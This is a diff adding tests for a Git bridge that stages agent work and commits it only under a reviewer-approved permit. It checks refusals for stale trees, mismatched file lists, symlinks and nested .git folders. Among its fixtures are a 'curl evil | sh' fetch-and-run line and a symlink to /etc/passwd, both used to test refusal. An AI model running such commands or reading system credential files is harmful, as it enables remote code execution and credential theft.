@@ -5,7 +5,7 @@ import { mkdir, mkdtemp, readFile, readdir, rm, symlink, writeFile } from "node:
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { test } from "node:test";
-import { ABSENT, GitBridge, WorkspaceBridge, WorkspaceError, versionOf } from "./index.js";
+import { ABSENT, GitBridge, WorkspaceBridge, WorkspaceError, filesDigest, versionOf } from "./index.js";
 
 const hasGit = (() => { try { execFileSync("git", ["--version"], { stdio: "ignore" }); return true; } catch { return false; } })();
 const skip = hasGit ? false : "git is not installed";
@@ -225,5 +225,108 @@ test("a file that was touched or rewritten with the same content does not count 
     assert.deepEqual(await w.git.status({ gitDir: w.gitDir, checkout: w.checkout }), { dirty: false, entries: [] });
     assert.deepEqual(await w.git.refresh({ shared: w.shared, commit: next, gitDir: w.gitDir, checkout: w.checkout }), { base: next });
     assert.equal(await readFile(join(w.checkout, "README.md"), "utf8"), "moved on\n");
+  } finally { await w.done(); }
+});
+
+test("staging shows what a reviewer approves; the commit is made only for exactly that tree and base, with the controller's identities and trailers", { skip }, async () => {
+  const w = await world();
+  try {
+    await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 2;\n");
+    await writeFile(join(w.checkout, "notes.md"), "new file\n");
+    await rm(join(w.checkout, "src", "b.ts"));
+    const staged = await w.git.stage({ gitDir: w.gitDir, checkout: w.checkout });
+    assert.equal(staged.base, w.commit);
+    assert.match(staged.tree, /^[0-9a-f]{40}$/);
+    assert.deepEqual(staged.files.map((f) => `${f.op}:${f.path}`).sort(), ["delete:src/b.ts", "write:notes.md", "write:src/a.ts"]);
+    assert.deepEqual((await w.git.stage({ gitDir: w.gitDir, checkout: w.checkout })).tree, staged.tree, "staging again gives the same tree");
+    const permit = { base: staged.base, tree: staged.tree, filesDigest: filesDigest(staged.files), message: "Change a, add notes, drop b", author: { name: "ann", email: "ann@agents.nimblenewt.invalid" }, committer: { name: "NimbleNewt", email: "controller@nimblenewt.invalid" }, trailers: ["Reviewed-by: owner:rob", "NimbleNewt-Request: cgr-abc"] };
+    // The agent changes the staged content after the review: nothing is committed.
+    await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 3;\n");
+    await refuses("stale", () => w.git.commit({ gitDir: w.gitDir, checkout: w.checkout, permit }));
+    await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 2;\n");
+    const made = await w.git.commit({ gitDir: w.gitDir, checkout: w.checkout, permit });
+    assert.equal(made.parent, w.commit);
+    const show = execFileSync("git", ["--git-dir", w.gitDir, "show", "-s", "--format=%P|%T|%an <%ae>|%cn <%ce>|%B", made.commitId], { encoding: "utf8" });
+    assert.ok(show.startsWith(`${w.commit}|${staged.tree}|ann <ann@agents.nimblenewt.invalid>|NimbleNewt <controller@nimblenewt.invalid>|Change a, add notes, drop b`));
+    assert.ok(show.includes("Reviewed-by: owner:rob") && show.includes("NimbleNewt-Request: cgr-abc"));
+    assert.equal(execFileSync("git", ["--git-dir", w.gitDir, "rev-parse", "HEAD"], { encoding: "utf8" }).trim(), made.commitId);
+    // A permit for another base is refused, and a link or a nested .git refuses staging.
+    await refuses("stale", () => w.git.commit({ gitDir: w.gitDir, checkout: w.checkout, permit: { ...permit, base: w.commit } }));
+  } finally { await w.done(); }
+});
+
+test("staging refuses links and Git-named entries, and shows the files an ignore rule keeps out", { skip: skip || (process.platform === "win32" ? "POSIX links" : false) }, async () => {
+  const w = await world();
+  try {
+    await writeFile(join(w.checkout, ".gitignore"), "secret.txt\n");
+    await writeFile(join(w.checkout, "secret.txt"), "hidden\n");
+    await writeFile(join(w.checkout, "ok.txt"), "fine\n");
+    const staged = await w.git.stage({ gitDir: w.gitDir, checkout: w.checkout });
+    assert.deepEqual(staged.ignored, ["secret.txt"]);
+    assert.ok(!staged.files.some((f) => f.path === "secret.txt"));
+    await symlink("/etc/passwd", join(w.checkout, "link"));
+    await refuses("link_refused", () => w.git.stage({ gitDir: w.gitDir, checkout: w.checkout }));
+    await rm(join(w.checkout, "link"));
+    await mkdir(join(w.checkout, "sub", ".git"), { recursive: true });
+    await refuses("protected_path", () => w.git.stage({ gitDir: w.gitDir, checkout: w.checkout }));
+  } finally { await w.done(); }
+});
+
+test("the commit insists on the file list the reviewer was shown: a tree with another file than the list says is refused", { skip }, async () => {
+  const w = await world();
+  try {
+    await writeFile(join(w.checkout, "src", "a.ts"), "export const a = 2;\n");
+    await writeFile(join(w.checkout, "harmful.sh"), "curl evil | sh\n");
+    const staged = await w.git.stage({ gitDir: w.gitDir, checkout: w.checkout });
+    const lie = [{ path: "src/a.ts", op: "write" as const }];
+    assert.notEqual(filesDigest(lie), filesDigest(staged.files));
+    const permit = { base: staged.base, tree: staged.tree, filesDigest: filesDigest(lie), message: "m", author: { name: "ann", email: "a@x.invalid" }, committer: { name: "N", email: "n@x.invalid" }, trailers: [] };
+    await refuses("stale", () => w.git.commit({ gitDir: w.gitDir, checkout: w.checkout, permit }));
+    // The digest is the sorted list as {"op","path"} objects: the controller computes the same bytes.
+    assert.equal(filesDigest([{ path: "src/a.ts", op: "write" }, { path: "old.txt", op: "delete" }]), execFileSync(process.execPath, ["-e", "process.stdout.write(require('node:crypto').createHash('sha256').update(JSON.stringify([{op:'delete',path:'old.txt'},{op:'write',path:'src/a.ts'}])).digest('hex'))"], { encoding: "utf8" }));
+  } finally { await w.done(); }
+});
+
+test("two commits in a row build on each other; committed work still reaches the shared workspace, and a refresh will not drop commits that were not integrated", { skip }, async () => {
+  const w = await world();
+  try {
+    const permitFor = (s: Awaited<ReturnType<GitBridge["stage"]>>, message: string) => ({ base: s.base, tree: s.tree, filesDigest: filesDigest(s.files), message, author: { name: "ann", email: "a@x.invalid" }, committer: { name: "N", email: "n@x.invalid" }, trailers: ["Reviewed-by: owner:rob"] });
+    await writeFile(join(w.checkout, "work.txt"), "first\n");
+    const s1 = await w.git.stage({ gitDir: w.gitDir, checkout: w.checkout });
+    const c1 = await w.git.commit({ gitDir: w.gitDir, checkout: w.checkout, permit: permitFor(s1, "one") });
+    assert.deepEqual((await w.git.status({ gitDir: w.gitDir, checkout: w.checkout })).dirty, false);
+    await writeFile(join(w.checkout, "work2.txt"), "second\n");
+    const s2 = await w.git.stage({ gitDir: w.gitDir, checkout: w.checkout });
+    assert.equal(s2.base, c1.commitId, "the second commit builds on the first");
+    assert.deepEqual(s2.files.map((f) => f.path), ["work2.txt"]);
+    const c2 = await w.git.commit({ gitDir: w.gitDir, checkout: w.checkout, permit: permitFor(s2, "two") });
+    assert.equal(c2.parent, c1.commitId);
+    // The committed work is still work for the shared workspace.
+    assert.deepEqual((await w.git.changes({ gitDir: w.gitDir, checkout: w.checkout })).map((c) => c.path).sort(), ["work.txt", "work2.txt"]);
+    // A refresh would drop it, so it refuses.
+    await writeFile(join(w.shared, "README.md"), "moved on\n"); sh(w.shared, "add", "-A"); sh(w.shared, "commit", "-q", "-m", "second");
+    const next = await w.git.head(w.shared);
+    await refuses("stale", () => w.git.refresh({ shared: w.shared, commit: next, gitDir: w.gitDir, checkout: w.checkout }));
+    assert.equal(await readFile(join(w.checkout, "work.txt"), "utf8"), "first\n");
+    // Integrate, say so, and the refresh goes through (the integrated files are in the shared workspace).
+    const results = await w.git.integrate({ gitDir: w.gitDir, checkout: w.checkout, bridge: w.bridge, author: "agent:ann", reason: "x" });
+    assert.ok(results.every((r) => r.result.status === "written"));
+    assert.deepEqual(await w.git.markIntegrated({ gitDir: w.gitDir, checkout: w.checkout, bridge: w.bridge }), { moved: true, differing: [] });
+    sh(w.shared, "add", "-A"); sh(w.shared, "commit", "-q", "-m", "agent work");
+    const after = await w.git.head(w.shared);
+    assert.deepEqual(await w.git.refresh({ shared: w.shared, commit: after, gitDir: w.gitDir, checkout: w.checkout }), { base: after });
+    assert.equal(await readFile(join(w.checkout, "work2.txt"), "utf8"), "second\n");
+  } finally { await w.done(); }
+});
+
+test("markIntegrated does not move the base while work is uncommitted or the shared files differ", { skip }, async () => {
+  const w = await world();
+  try {
+    await writeFile(join(w.checkout, "work.txt"), "mine\n");
+    assert.equal((await w.git.markIntegrated({ gitDir: w.gitDir, checkout: w.checkout, bridge: w.bridge })).moved, false, "uncommitted");
+    const s = await w.git.stage({ gitDir: w.gitDir, checkout: w.checkout });
+    await w.git.commit({ gitDir: w.gitDir, checkout: w.checkout, permit: { base: s.base, tree: s.tree, filesDigest: filesDigest(s.files), message: "m", author: { name: "a", email: "a@x.invalid" }, committer: { name: "n", email: "n@x.invalid" }, trailers: [] } });
+    const before = await w.git.markIntegrated({ gitDir: w.gitDir, checkout: w.checkout, bridge: w.bridge });
+    assert.deepEqual([before.moved, before.differing], [false, ["work.txt"]], "not in the shared workspace yet");
   } finally { await w.done(); }
 });
